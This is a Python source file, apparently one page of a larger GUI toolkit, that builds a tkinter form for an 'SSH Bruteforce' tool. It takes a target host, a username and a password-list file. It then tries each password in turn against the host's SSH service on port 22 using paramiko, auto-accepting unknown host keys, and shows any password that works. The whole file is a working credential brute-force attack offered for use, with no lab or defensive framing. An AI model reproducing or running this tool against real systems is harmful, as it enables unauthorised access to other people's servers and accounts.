from tkinter import *
import tkinter.messagebox
from socket import *
from threading import Thread,Lock
import sys,re,random, requests, os

import tkinter as tk  # python 3
from tkinter import font  as tkfont  # python 3
# import Tkinter as tk     # python 2
# import tkFont as tkfont  # python 2
from tkinter import font as tkfont
from tkinter import font, messagebox
import PySimpleGUI as sg
from nav_bar import *


class SshBrute(tk.Frame):
	def __init__(self, parent, controller):
		tk.Frame.__init__(self, parent)
		self.controller = controller
		abtframefont = tkfont.Font(family='Calibri', size=33, weight="bold")
		display_nav_bar(self, controller)
		aboutframe = tk.Label(self, text="    SSH Bruteforce", bg='#3B5262', fg='white', anchor="c", font=abtframefont)
		aboutframe.place(rely=0.08, relheight=0.12, relwidth=1)

		allscreenframe = tk.Label(self, bg='white')
		allscreenframe.place(rely=0.2, relheight=1, relwidth=1)

		# Set input box Entry
		label = Label(self,text ="Please Enter the Target Address: ",font=('Calibri', 13),  bg='#4D6C84', fg='white', anchor='c').place(rely=0.28, relx=0.16, relheight=0.06, relwidth=0.22)
		# Set input box Entry
		label = Label(self,text ="Please Enter The Target Username: ",font=('Calibri', 13),  bg='#4D6C84', fg='white', anchor='c').place(rely=0.36, relx=0.16, relheight=0.06, relwidth=0.22)
		# Set input box Entry
		label = Label(self,text ="Please Enter the File Path: ",font=('Calibri', 13),  bg='#4D6C84', fg='white', anchor='c').place(rely=0.44, relx=0.16, relheight=0.06, relwidth=0.22)

		self.hostaddress = Entry(self, font=('Calibri', 13),)
		self.hostaddress.place(rely=0.28, relx=0.36, relheight=0.06, relwidth=0.3)

		self.nameuser = Entry(self, font=('Calibri', 13),)
		self.nameuser.place(rely=0.36, relx=0.36, relheight=0.06, relwidth=0.3)

		self.filepath = Entry(self, font=('Calibri', 13),)
		self.filepath.place(rely=0.44, relx=0.36, relheight=0.06, relwidth=0.3)
		#Set scan button
		Button(self,text="Start Bruteforce",font=('Calibri', 13),  bg='#4D6C84', fg='white', anchor='c',command=self.mainsshbrute).place(rely=0.36, relx=0.7, relheight=0.08, relwidth=0.08)


	def mainsshbrute(self):
		# Imports
		import paramiko, sys, os, socket

		# Variables
		global host, username, line, input_file

		line = "\n------------------------------------------------------\n"

		#Functions
		def ssh_connect(password, code = 0):
			ssh = paramiko.SSHClient()
			ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

			try:
				ssh.connect(host, port=22, username=username, password=password)
			except paramiko.AuthenticationException:
				#[*] Authentication Failed ...
				code = 1
			except socket.error as e:
				#[*] Connection Failed ... Host Down
				code = 2

			ssh.close()
			return code

		# User Inputs
		try:

			host = self.hostaddress.get()
			username = self.nameuser.get()
			input_file = self.filepath.get()

			if os.path.exists(input_file) == False:
				print("\n[*] File Path Does Not Exist")
				sys.exit(4)
		except KeyboardInterrupt:
			print("\n\n[*] User Requested An Interupt")
			sys.exit(3)



		# Main
		input_file = open(input_file)

		for i in input_file.readlines():
			password = i.strip("\n")
			try:
				response = ssh_connect(password)

				if response == 0:
					success = Label(self, text=("%s[*] User: %s [*] Password Found: %s%s" % (line, username, password, line)), font=('Calibri', 13))
					success.place(rely=0.58, relx=0.36, relwidth=0.3)
					#print("%s[*] User: %s [*] Password Found: %s%s" % (line, username, password, line))
					#sys.exit(0)
					break
				elif response == 1:
					result = Label(self, text=("[*] User: %s [*] Password: %s => Login Incorrect <=" % (username, password)), font=('Calibri', 13))
					result.place(rely=0.68, relx=0.36, relwidth=0.3)
					print("[*] User: %s [*] Password: %s => Login Incorrect <=" % (username, password))
				elif response == 2:
					result = Label(self, text=("[*] Connection Could Not Be Established To Address: %s" % (host)), font=('Calibri', 13))
					result.place(rely=0.68, relx=0.36, relwidth=0.3)
					#print("[*] Connection Could Not Be Established To Address: %s" % (host))
					sys.exit(2)
			except Exception as e:
				print(e)
				pass

		input_file.close()


